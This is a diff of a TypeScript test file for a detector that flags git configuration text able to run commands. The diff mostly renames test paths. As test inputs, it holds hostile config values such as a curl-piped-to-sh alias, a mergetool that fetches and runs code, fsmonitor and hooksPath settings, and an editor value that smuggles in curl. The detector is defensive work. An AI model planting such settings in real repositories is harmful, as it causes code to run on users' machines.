@@ -10,20 +10,25 @@ describe('gitConfigTextRunsCommand', () => {
     expect(gitConfigTextRunsCommand('/repo/.alt/config', '[core]\n\tfsmonitor = ./hook.sh\n')).toBe(
       true,
     );
-    expect(gitConfigTextRunsCommand('/repo/out', '[diff]\n  external = ./run.sh\n')).toBe(true);
+    expect(gitConfigTextRunsCommand('/repo/config', '[diff]\n  external = ./run.sh\n')).toBe(true);
     expect(
-      gitConfigTextRunsCommand('/repo/c', '[filter "x"]\n  smudge = sh -c id\n  clean = cat\n'),
+      gitConfigTextRunsCommand(
+        '/repo/config',
+        '[filter "x"]\n  smudge = sh -c id\n  clean = cat\n',
+      ),
     ).toBe(true);
-    expect(gitConfigTextRunsCommand('/repo/c', '[core]\n\thooksPath = .evil\n')).toBe(true);
+    expect(gitConfigTextRunsCommand('/repo/config', '[core]\n\thooksPath = .evil\n')).toBe(true);
   });
 
   it('reads the keys that name a program only when the value is a shell', () => {
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\tpager = sh -c "id"\n')).toBe(true);
-    expect(gitConfigTextRunsCommand('/r/c', '[alias]\n\tx = !curl example.com | sh\n')).toBe(true);
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\tpager = less\n\teditor = vim\n')).toBe(
+    expect(gitConfigTextRunsCommand('/r/config', '[core]\n\tpager = sh -c "id"\n')).toBe(true);
+    expect(gitConfigTextRunsCommand('/r/config', '[alias]\n\tx = !curl example.com | sh\n')).toBe(
+      true,
+    );
+    expect(gitConfigTextRunsCommand('/r/config', '[core]\n\tpager = less\n\teditor = vim\n')).toBe(
       false,
     );
-    expect(gitConfigTextRunsCommand('/r/c', '[alias]\n\tco = checkout\n')).toBe(false);
+    expect(gitConfigTextRunsCommand('/r/config', '[alias]\n\tco = checkout\n')).toBe(false);
   });
 
   it('leaves the ordinary contents of a .gitconfig alone', () => {
@@ -40,28 +45,33 @@ describe('gitConfigTextRunsCommand', () => {
   });
 
   it('still reads a shell alias, a shell pager and a merge tool that starts a shell', () => {
-    expect(gitConfigTextRunsCommand('/r/c', '[alias]\n\tx = !sh -c id\n')).toBe(true);
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\tpager = sh -c "id; less"\n')).toBe(true);
-    expect(
-      gitConfigTextRunsCommand('/r/c', '[mergetool "x"]\n\tcmd = bash -c "curl x.example | sh"\n'),
-    ).toBe(true);
-    expect(gitConfigTextRunsCommand('/r/c', '[filter "x"]\n\tsmudge = sh -c id\n')).toBe(true);
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\teditor = vim && curl x.example\n')).toBe(
+    expect(gitConfigTextRunsCommand('/r/config', '[alias]\n\tx = !sh -c id\n')).toBe(true);
+    expect(gitConfigTextRunsCommand('/r/config', '[core]\n\tpager = sh -c "id; less"\n')).toBe(
       true,
     );
+    expect(
+      gitConfigTextRunsCommand(
+        '/r/config',
+        '[mergetool "x"]\n\tcmd = bash -c "curl x.example | sh"\n',
+      ),
+    ).toBe(true);
+    expect(gitConfigTextRunsCommand('/r/config', '[filter "x"]\n\tsmudge = sh -c id\n')).toBe(true);
+    expect(
+      gitConfigTextRunsCommand('/r/config', '[core]\n\teditor = vim && curl x.example\n'),
+    ).toBe(true);
   });
 
   it('does not take a switch for a command', () => {
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\tfsmonitor = true\n')).toBe(false);
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\tfsmonitor = false\n')).toBe(false);
-    expect(gitConfigTextRunsCommand('/r/c', '[core]\n\tfsmonitor =\n')).toBe(false);
+    expect(gitConfigTextRunsCommand('/r/config', '[core]\n\tfsmonitor = true\n')).toBe(false);
+    expect(gitConfigTextRunsCommand('/r/config', '[core]\n\tfsmonitor = false\n')).toBe(false);
+    expect(gitConfigTextRunsCommand('/r/config', '[core]\n\tfsmonitor =\n')).toBe(false);
   });
 
   it('ignores documents, source files, data files and empty text', () => {
     const section = '[core]\n\tfsmonitor = ./x.sh\n';
     expect(gitConfigTextRunsCommand('/r/GITCONFIG.md', section)).toBe(false);
     expect(gitConfigTextRunsCommand('/r/notes.txt', section)).toBe(false);
-    expect(gitConfigTextRunsCommand('/r/c', '')).toBe(false);
+    expect(gitConfigTextRunsCommand('/r/config', '')).toBe(false);
     for (const name of ['t.test.ts', 'fixture.json', 'a.py', 'x.yaml', 'setup.sh']) {
       expect(gitConfigTextRunsCommand(`/r/${name}`, section), name).toBe(false);
     }
@@ -70,14 +80,16 @@ describe('gitConfigTextRunsCommand', () => {
   it('is not hidden by padding the config with prose', () => {
     const section = '[core]\n\tfsmonitor = ./x.sh\n';
     const prose = `Here is how to set it up:\n\n${section}\nThen run the thing and see.\nIt is slow.\nThat is all.\n`;
-    expect(gitConfigTextRunsCommand('/r/c', prose)).toBe(true);
-    expect(gitConfigTextRunsCommand('/r/c', `${'prose line\n'.repeat(50)}${section}`)).toBe(true);
+    expect(gitConfigTextRunsCommand('/r/config', prose)).toBe(true);
+    expect(gitConfigTextRunsCommand('/r/config', `${'prose line\n'.repeat(50)}${section}`)).toBe(
+      true,
+    );
   });
 
   it('accepts comments, blank lines and CRLF as part of the shape', () => {
     expect(
       gitConfigTextRunsCommand(
-        '/r/c',
+        '/r/config',
         '# set up\r\n\r\n[core]\r\n\t; why\r\n\tfsmonitor = ./h.sh\r\n',
       ),
     ).toBe(true);
